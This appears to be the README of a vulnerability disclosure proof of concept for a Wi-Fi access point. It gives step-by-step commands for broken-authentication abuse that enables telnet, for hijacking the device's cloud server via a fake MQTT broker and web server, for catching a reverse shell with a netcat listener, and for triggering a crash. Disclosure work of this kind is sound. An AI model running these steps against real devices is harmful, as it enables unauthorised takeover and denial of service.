# Proof of concept (PoC) for vulnerabilities

Those vulnerabilities requires to have an access to the administration web interface at 192.168.188.253.
In my case, I work on Linux with Wi-Fi (adapter wlp0s20f3) so I have to do the following command:

```bash
sudo ip addr add 192.168.188.182/24 dev wlp0s20f3
```

## Install dependencies for scripts

I suggest to do it from a Python3 virtual environment:

```bash
python3 -m pip install -r requirements.txt
```

Docker must be installed for the rce proof of concept.

## Broken authentication

The broken authentication proof of concept is the script *broken-auth/poc.py*.
It can be executed using the commands:

```bash
cd broken-auth
python3 broken-auth.py
```

The script authenticate to the access point (AP) web server: it gets a token.
Then it list logs and enable telnet to proove that it can perform authenticated actions.

## Remote code executions (RCE) and crash in cloud-client binary

First thing to do is to update the configuration file *rce/configuration.ini*.
I suggest to use the same computer to host all component so all the 'IP' fields must be the same.

Go to the directory 'rce'.

1. Build then start the fake broker: container:

    Build with:

    ```bash
    cd mqtt
    docker build --tag 'rce' .
    ```

    Start with:

    ```bash
    docker run -p 1883:1883 rce
    ```

2. Start the fake web server: webserver.py

    ```bash
    python3 webserver.py
    ```

3. Update the AP cloud server with our fake web server: update_cloud_server.py

    ```bash
    python3 update_cloud_server.py
    ```

    Logs of our webserver must log that the AP reached the endpoints  */cloudnetlot/backend/getclient* and */cloudnetlot/backend/getbind*.

4. Start listener to receive shell from the AP.
    The port must match the reverse shell port in *rce/configuration.ini*. e.g:

    ```bash
    nc -lvp 7891
    ```

5. Send payload using MQTT protocol: cloud.py

    ```bash
    python3 cloud.py
    ```

    There are two RCE in this files, functions are *set_rce* and *upgrade_rce* so comment the right one in the main.
    By default *set_rce* is not commented.
    There is also a crash, function *do_dos_in_radioid*.
    The listener perviously started receives the shell.
